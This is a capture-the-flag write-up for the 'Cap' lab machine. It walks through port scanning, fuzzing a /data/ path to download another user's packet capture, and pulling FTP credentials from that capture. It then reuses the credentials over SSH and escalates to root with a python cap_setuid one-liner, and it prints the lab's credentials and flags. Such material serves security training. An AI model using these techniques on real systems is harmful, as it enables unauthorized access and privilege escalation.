# Cap

export IP=10.10.10.245

# Solution

The classic start...

```bash
cmd: sudo nmap -sC -sV -oN nmap.initial $IP

PORT   STATE SERVICE VERSION                                                                                                                                                                        
21/tcp open  ftp     vsftpd 3.0.3                                                                                                                                                                   
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)                                                                                                                   
| ssh-hostkey:                                                                                                                                                                  
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)                                                                                                                  
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)                                                                                                                 
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)                                                                                                               
80/tcp open  http    gunicorn                                                                                                                                                   
| fingerprint-strings:                                                                                                                                                          
|   FourOhFourRequest:                                                                                                                                                          
|     HTTP/1.0 404 NOT FOUND                                                                                                                                                    
|     Server: gunicorn                                                                                                                                                          
|     Date: Thu, 10 Jun 2021 11:25:32 GMT                                                                                                                                       
|     Connection: close                                                                                                                                                         
|     Content-Type: text/html; charset=utf-8                                                                                                                                    
|     Content-Length: 232                                                                                                                                                       
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">                                                                                                                   
|     <title>404 Not Found</title>                                                                                                                                              
|     <h1>Not Found</h1>                                                                                                                                                        
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>                                           
|   GetRequest:                                                                                                                                                                 
|     HTTP/1.0 200 OK                                                                                                                                                           
|     Server: gunicorn                                                                                                                                                          
|     Date: Thu, 10 Jun 2021 11:25:26 GMT                                                                                                                                       
|     Connection: close                                                                                                                                                         
|     Content-Type: text/html; charset=utf-8                                                                                                                                    
|     Content-Length: 19386                                                                                                                                                     
|     <!DOCTYPE html>                                                                                                                                                           
|     <html class="no-js" lang="en">                                                                                                                                            
|     <head>                                                                                                                                                                    
|     <meta charset="utf-8">                                                                                                                                                    
|     <meta http-equiv="x-ua-compatible" content="ie=edge">                                                                                                                     
|     <title>Security Dashboard</title>                                                                                                                                         
|     <meta name="viewport" content="width=device-width, initial-scale=1">                                                                                                      
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">                                                                                        
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">                                                                                                              
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">                                                                                                           
|     <link rel="stylesheet" href="/static/css/themify-icons.css">                                                                                                              
|     <link rel="stylesheet" href="/static/css/metisMenu.css">                                    
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">                             
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">                                 
|     <!-- amchar        
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn          
|     Date: Thu, 10 Jun 2021 11:25:26 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8                                                      
|     Allow: GET, HEAD, OPTIONS                                                         
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close         
|     Content-Type: text/html                                                                                                                                                   
|     Content-Length: 196                                                               
|     <html>                                                                            
|     <head>                                                                            
|     <title>Bad Request</title>                                                        
|     </head>                                    
|     <body>                                     
|     <h1><p>Bad Request</p></h1>                
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;                 
|     </body>                                    
|_    </html>                                    
|_http-server-header: gunicorn                   
|_http-title: Security Dashboard
```

Some little ports (21,22, 80), lets start with the **ftp** one. <br>

Trying **anonymous** login and looking for **CVE's** didn't pay off <br>

Lets check the web app ! <br>

There's a couple of menus:
- Dashboard: nothing interesting
- Security snapshot: creates a capture file (.pcap) for 5 seconds and gives its download link
- IP config: interfaces information
- Network status: shows the machine's connections and their states

From the **network status** menu we can assume that there are no other open ports at higher numbers
```bash
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN 
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN  
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN 

# -- snip --

tcp6       0      0 :::21                   :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN 
``` 

By checking the requests/responses i was not able to identify any potential attack vector, so i'll pivot to some more testing <br>

Lets start with a directory bruteforcing/fuzzing! 
```bash
cmd: gobuster dir -u http://10.10.10.245 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o fuzz/big.log -t 80

/capture              (Status: 302) [Size: 224] [--> http://10.10.10.245/data/109]
/data                 (Status: 302) [Size: 208] [--> http://10.10.10.245/]        
/ip                   (Status: 200) [Size: 17465]                                 
/netstat              (Status: 200) [Size: 48119]
```

So we got pretty much what was available through the menu but an interestng thing is that the **/capture** consists of **data** in its path with an ID for a **.pcap** file <br>

Let's fuzz **/data** to see if we can access other .pcaps <br>

```bash
cmd: gobuster dir -u http://10.10.10.245/data/ -w /usr/share/seclists/Discovery/Web-Content/data.big.txt -o fuzz/big.log -t 80 -b 302,404

/110                  (Status: 200) [Size: 17146]                                                
/00000000             (Status: 200) [Size: 17147]                                                
/001                  (Status: 200) [Size: 17144]                                                
/0001                 (Status: 200) [Size: 17144]                                                
/002                  (Status: 200) [Size: 17144]                                                
/0007                 (Status: 200) [Size: 17144]                                                
/000000               (Status: 200) [Size: 17147]                                                
/101                  (Status: 200) [Size: 17146]                                                
/102                  (Status: 200) [Size: 17146]                                                
/02                   (Status: 200) [Size: 17144]
# -- snip -- (130 results)
```

We can see that the ones with all **00's** have the biggest size, lets check them ! To access the .pcap we need to access the **../data/00000000** path and download it <br>

Within the .pcap we can see several protocols being used, but one is particularly interesting: **FTP** <br>

If we use **wireshark's follow tcp stream** feature, we can see the whole ftp communication
```sql
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
SYST
215 UNIX Type: L8
PORT 192,168,196,1,212,140
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
PORT 192,168,196,1,212,141
200 PORT command successful. Consider using PASV.
LIST -al
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 192,168,196,1,212,143
200 PORT command successful. Consider using PASV.
RETR notes.txt
550 Failed to open file.
QUIT
221 Goodbye.
``` 

And we got some creds here! ```nathan:Buck3tH4TF0RM3!```, lets check the ftp server <br>

The FTP server is mapped, as it seems, to the user's home folder... Spicy :D
```bash
ftp-cmd > ls -la

drwxr-xr-x    5 1001     1001         4096 Jun 16 10:11 .
drwxr-xr-x    3 0        0            4096 May 23 19:17 ..
lrwxrwxrwx    1 0        0               9 May 15 21:40 .bash_history -> /dev/null
-rw-r--r--    1 1001     1001          220 Feb 25  2020 .bash_logout
 -rw-r--r--    1 1001     1001         3771 Feb 25  2020 .bashrc
drwx------    2 1001     1001         4096 May 23 19:17 .cache
drwx------    4 1001     1001         4096 Jun 16 10:11 .gnupg
-rw-r--r--    1 1001     1001          807 Feb 25  2020 .profile
lrwxrwxrwx    1 0        0               9 May 27 09:16 .viminfo -> /dev/null
drwxr-xr-x    3 1001     1001         4096 Jun 16 10:10 snap
-r--------    1 1001     1001           33 Jun 16 10:06 user.txt

ftp-cmd > get user.txt
# FLAG: fabfa5b2c0439e4b1a6f34f144f22248
```

Since i was not finding anything else (interesting), i tried ssh with the same creds and we got **credentials reuse** :D <br>

Now, after i ran **linpeas**, i had not much interesting information/leads besides this

```sql
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Since we had little to no information, i went on checking if the application had any type of hidden features <br>

Reading through it is pretty easy, the code isn't that badly written, and we can find intersting things
```py
"""This is a snip from the /var/www/html/app.py file"""

@app.route("/capture")
@limiter.limit("10 per minute")
def capture():
    get_lock()
    pcapid = get_appid()
    increment_appid()
    release_lock()
    path = os.path.join(app.root_path, "upload", str(pcapid) + ".pcap")
    ip = request.remote_addr
    # permissions issues with gunicorn and threads. hacky solution for now.
    #os.setuid(0)
    #command = f"timeout 5 tcpdump -w {path} -i any host {ip}"
    command = f"""python3 -c 'import os; os.setuid(0); os.system("timeout 5 tcpdump -w {path} -i any host {ip}")'"""
    os.system(command)
    #os.setuid(1000) 
    return redirect("/data/" + str(pcapid))
                                              
```

My initial idea was to spoof the request's ip address and inject into the **command** via the **id = request.remote_addr**. No success ! <br>

But, as we can see, the command uses **os.setuid(0)** to execute as root (since the app.py belongs to the user nathan and tcpdump needs root privileges) <br>

If we just searched for what we found in linpeas we would came to the same conclusion, python with the **cap_setuid** is able to change the UID of the process <br>

With this, we can exploit python's configuration in order to privesc with a simple one-liner
```bash
cmd: python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
cmd: whoami && id
root
uid=0(root) gid=1001(nathan) groups=1001(nathan)
cmd: cat /root/root.txt
# FLAG: e81e33c4b122d5773df0d668843e0a00
```

